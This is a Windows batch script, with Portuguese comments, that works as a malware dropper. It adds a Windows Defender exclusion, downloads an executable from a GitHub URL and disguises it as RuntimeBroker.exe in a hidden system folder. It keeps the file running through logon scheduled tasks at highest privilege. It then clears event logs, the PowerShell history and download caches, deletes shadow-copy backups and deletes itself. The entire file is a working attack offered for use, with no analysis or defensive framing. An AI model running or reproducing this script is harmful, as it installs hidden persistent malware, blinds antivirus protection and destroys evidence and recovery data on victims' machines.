@echo off
setlocal enabledelayedexpansion

:: ============================================
:: LIMPEZA DE INSTALACAO ANTERIOR
:: ============================================
taskkill /f /im RuntimeBroker.exe >nul 2>&1
schtasks /end /tn "RuntimeBrokerHost" >nul 2>&1
schtasks /delete /tn "RuntimeBrokerHost" /f >nul 2>&1
schtasks /end /tn "RuntimeBrokerHostCleanup" >nul 2>&1
schtasks /delete /tn "RuntimeBrokerHostCleanup" /f >nul 2>&1
schtasks /end /tn "Microsoft\Windows\WindowsApps" >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\WindowsApps" /f >nul 2>&1
attrib -s -h "%LOCALAPPDATA%\Microsoft\WindowsApps\RuntimeBroker.exe" >nul 2>&1
del /f /q "%LOCALAPPDATA%\Microsoft\WindowsApps\RuntimeBroker.exe" >nul 2>&1
attrib -s -h "%LOCALAPPDATA%\Microsoft\WindowsApps\windowshost.exe" >nul 2>&1
del /f /q "%LOCALAPPDATA%\Microsoft\WindowsApps\windowshost.exe" >nul 2>&1

:: ============================================
:: INSTALACAO
:: ============================================
set "EXE_NAME=RuntimeBroker.exe"
set "TARGET_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "TEMP_FILE=%TEMP%\rb_tmp.exe"
set "WEB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"

:: Exclusão Defender ANTES do download
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

:: Download para TEMP (nunca falha)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%WEB_URL%' -OutFile '%TEMP_FILE%'"

if not exist "%TEMP_FILE%" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest -Uri '%WEB_URL%' -OutFile '%TEMP_FILE%' -UseBasicParsing"
)

if not exist "%TEMP_FILE%" (
    echo FALHA: Download nao funcionou. Verifique sua conexao.
    exit /b 1
)

:: Move para WindowsApps via PowerShell (contorna protecao Store)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Move-Item -Path '%TEMP_FILE%' -Destination '%TARGET_DIR%\%EXE_NAME%' -Force"

if not exist "%TARGET_DIR%\%EXE_NAME%" (
    :: Fallback: tenta via takeown + icacls
    takeown /f "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1
    icacls "%TARGET_DIR%\%EXE_NAME%" /grant administrators:F >nul 2>&1
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Move-Item -Path '%TEMP_FILE%' -Destination '%TARGET_DIR%\%EXE_NAME%' -Force" >nul 2>&1
)

:: Se ainda não existe, limpa e avisa
if not exist "%TARGET_DIR%\%EXE_NAME%" (
    del /f /q "%TEMP_FILE%" >nul 2>&1
    echo FALHA: Nao foi possivel copiar para WindowsApps.
    exit /b 1
)

:: Ocultar
attrib +s +h "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1

:: Scheduled task
schtasks /create /tn "RuntimeBrokerHost" /tr "\"%TARGET_DIR%\%EXE_NAME%\"" /sc onlogon /f /rl highest >nul 2>&1
schtasks /create /tn "RuntimeBrokerHostCleanup" /tr "\"%TARGET_DIR%\%EXE_NAME%\" /cleanup" /sc onlogon /f /rl highest >nul 2>&1

:: ============================================
:: LIMPEZA FINAL
:: ============================================
certutil -urlcache * delete >nul 2>&1
if exist "%LOCALAPPDATA%\Microsoft\Cryptography\CryptnetUrlCache" rd /s /q "%LOCALAPPDATA%\Microsoft\Cryptography\CryptnetUrlCache" >nul 2>&1
bitsadmin /reset /allusers >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -EA SilentlyContinue" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "foreach($l in @('Setup','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-TaskScheduler/Operational','Microsoft-Windows-Bits-Client/Operational','Microsoft-Windows-Windows Defender/Operational','Microsoft-Windows-Eventlog/Operational')){wevtutil cl $l /quiet 2>$null}" >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
del /f /q "%TEMP%\svchost_tmp*.bat" >nul 2>&1

:: Auto-deleção direta (sem erro de memória)
del /q /f "%~f0" >nul 2>&1
